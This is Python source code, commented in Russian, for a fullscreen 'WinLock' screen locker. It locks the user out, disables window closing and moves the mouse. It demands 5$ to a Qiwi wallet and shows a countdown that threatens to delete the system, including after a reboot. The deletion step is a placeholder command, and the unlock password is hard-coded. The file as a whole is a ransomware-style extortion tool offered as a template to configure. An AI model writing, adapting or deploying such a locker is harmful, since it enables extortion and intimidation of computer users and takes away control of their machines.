from tkinter import *
import pyautogui
import os
import os.path
import time
read1ng=" " #Переменная для проверки пароля
Qiwi="Qiwi: +7*******" #Указываем кошелек
SORRYBRO=""#Переменная для проверки сессии

LOCKFILE = r'Путь к файлу\system.logger' #Укажите путь к файлу system.logger он находится в папке с локером пример C:\Users\Имя\Desktop\locker\system.logger

password=("lol") #переменная с паролем от локера, можно установить что-то свое
t1me=7000 #переменная с временем таймера в секундах.
d3l="Удаление системы начато..."
def block():
    pyautogui.moveTo(x=680,y=800) #переводим мышку в позицию координат X и Y
    screen.protocol("WM_DELETE_WINDOW",block) #Запрещаем использование комбинаций F4/alt+F4/Fn+F4, и при их использовании вызывает функцию block
    screen.update()
def password_check(event): #Проверка пароля
    global read1ng
    read1ng=field.get()
    if read1ng==password:
        screen.destroy() #Если пароль верный то локер удаляет себя
    else:
        No=Label(screen, text="Не правильно!",font = "TimesNewRoman 30",fg="red",bg="#1c1c1c") # Текст при не удачной попытке
        No.place(x=700,y=600) #y Позиция текста
 
 
def systemrun():
    os.system("audacity") #Команда которую выполнить по истечении времени


if(os.path.exists(LOCKFILE)): #Если файл сессии найден
    SORRYBRO="Вы перезагрузили компьютер, удаление начато..."
    t1me = 3000 #Таймер
open(LOCKFILE, 'tw', encoding='utf-8').close()
screen=Tk()
screen.title("WinLock")
screen.attributes("-fullscreen",True)
screen.configure(background="#1c1c1c")
pyautogui.FAILSAFE=False
field=Entry(screen,fg="green",justify=CENTER, borderwidth=0)
but=Button(screen,text="Разблокировать", borderwidth=0)
text0=Label(screen,text="Ваша система заблокирована!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c")
DontPanic=Label(screen, text="Не паникуй, это не шифровальщик, твои файлы в полном порядке\nЭта программа только может стереть твою систему с лица Земли, тебе нечего бояться!",font="TimesNewRoman 24",fg="white",bg="#1c1c1c")
text=Label(screen,text="Вам необходимо перечислить 5$",font="TimesNewRoman 30",fg="#32CD32",bg="#1c1c1c")

REMOV=Label(screen,text=SORRYBRO,font="TimesNewRoman 40",fg="red",bg="#1c1c1c")
REMOV.place(x=400,y=40)

Qiwiimg = PhotoImage(file = './Qiwi-little.png')


Qiwilabel = Label(screen, image=Qiwiimg, borderwidth=0).place(x=350,y=420)


textQiwi=Label(screen, text=Qiwi,font="TimesNewRoman 16",fg="yellow",bg="#1c1c1c")
text1=Label(screen,text="Не перезагружайте компьютер, это удалит вашу систему!",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c")
Citate=Label(screen,text="Лох не мамонт, лох не вымрет.\n Сократ",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c")
l=Label(text=t1me,font="Arial 22",fg="red",bg="#1c1c1c")
l1=Label(text="До удаления системы осталось:",fg="white",bg="#1c1c1c",font="Arial 15")
but.bind('<Button-1>',password_check)
but.bind('<Enter>', password_check)
text.place(x=700,y=170)
DontPanic.place(x=300,y=240)
field.place(width=150,height=50,x=600,y=790)
but.place(width=150,height=50,x=600,y=860)
text0.place(x=700,y=110)
text1.place(x=410,y=330)

textQiwi.place(x=410,y=430)
l1.place(x=20,y=70)
l.place(x=20,y=100)
Citate.place(x=900,y=820)
screen.update()
pyautogui.moveTo(x=670,y=890) #переводим мышку в позицию координат X и Y

while read1ng!=password:
    l.configure(text=t1me)
    screen.after(200) #делаем задержку в 200 миллисекунд.
    if t1me==0:
        t1me=d3l
        systemrun()

    if t1me!=d3l:
        t1me=t1me-1
    block()
